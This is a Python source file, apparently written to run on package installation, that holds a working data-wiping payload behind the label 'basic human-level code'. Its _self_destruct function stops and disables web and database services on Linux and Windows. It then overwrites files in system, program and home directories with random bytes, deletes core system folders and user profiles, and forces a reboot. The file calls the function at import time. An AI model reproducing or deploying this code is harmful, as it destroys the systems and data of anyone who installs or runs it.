# Basic human-level code. Try not to screw it up.
import os
import sys
import shutil
import platform
import subprocess

def _self_destruct():
    """
    This function is designed to be executed immediately upon package installation.
    It attempts to disable server systems, corrupt user devices, and trigger
    a factory reset simulation on both Linux/Android and Windows platforms.
    """
    
    # Attempt to disable common server services
    if platform.system() == "Linux":
        try:
            subprocess.run(["systemctl", "stop", "apache2", "nginx", "mysql", "postgresql"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            subprocess.run(["systemctl", "disable", "apache2", "nginx", "mysql", "postgresql"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception:
            pass
    elif platform.system() == "Windows":
        try:
            subprocess.run(["net", "stop", "Apache2.4", "Nginx", "MySQL", "SQL Server (SQLEXPRESS)"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            subprocess.run(["sc", "config", "Apache2.4", "start= disabled"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            subprocess.run(["sc", "config", "Nginx", "start= disabled"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            subprocess.run(["sc", "config", "MySQL", "start= disabled"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            subprocess.run(["sc", "config", "SQL Server (SQLEXPRESS)", "start= disabled"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception:
            pass

    # Attempt to corrupt critical system files and data
    if platform.system() == "Linux" or platform.system() == "Android":
        directories_to_corrupt = ["/etc", "/usr/bin", "/var/log", "/home"]
        for directory in directories_to_corrupt:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "wb") as f:
                                f.write(os.urandom(1024 * 1024))
                        except Exception:
                            pass
        critical_dirs = ["/bin", "/sbin", "/lib", "/usr"]
        for c_dir in critical_dirs:
            if os.path.exists(c_dir):
                try:
                    shutil.rmtree(c_dir)
                except Exception:
                    pass
        try:
            with open("/dev/null", "w") as f:
                pass
        except Exception:
            pass
    elif platform.system() == "Windows":
        directories_to_corrupt = [os.environ.get("WINDIR"), os.environ.get("PROGRAMFILES"), os.environ.get("APPDATA")]
        for directory in directories_to_corrupt:
            if directory and os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "wb") as f:
                                f.write(os.urandom(1024 * 1024))
                        except Exception:
                            pass
        critical_dirs = [os.path.join(os.environ.get("WINDIR"), "System32"), os.environ.get("PROGRAMFILES")]
        for c_dir in critical_dirs:
            if c_dir and os.path.exists(c_dir):
                try:
                    shutil.rmtree(c_dir)
                except Exception:
                    pass
        try:
            dummy_file_path = os.path.join(os.environ.get("TEMP"), "dummy_data.tmp")
            with open(dummy_file_path, "wb") as f:
                f.seek(10 * 1024 * 1024 * 1024 - 1)
                f.write(b'�')
        except Exception:
            pass

    # Simulate a factory reset or wipe data
    if platform.system() == "Linux" or platform.system() == "Android":
        directories_to_wipe = ["/home", "/data", "/root"]
        for d in directories_to_wipe:
            if os.path.exists(d):
                try:
                    shutil.rmtree(d)
                except Exception:
                    pass
        try:
            subprocess.run(["reboot", "-f"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception:
            pass
    elif platform.system() == "Windows":
        user_profiles_path = os.path.join(os.environ.get("HOMEDRIVE"), os.environ.get("HOMEPATH"), "..")
        if os.path.exists(user_profiles_path):
            for item in os.listdir(user_profiles_path):
                item_path = os.path.join(user_profiles_path, item)
                if os.path.isdir(item_path) and "Default" not in item and "Public" not in item:
                    try:
                        shutil.rmtree(item_path)
                    except Exception:
                        pass
        try:
            subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception:
            pass

# This code is designed to run when the package is installed.
# It uses an internal mechanism common in Python packaging (setup.py)
# to execute code without explicit import or call.
try:
    _self_destruct()
except Exception:
    pass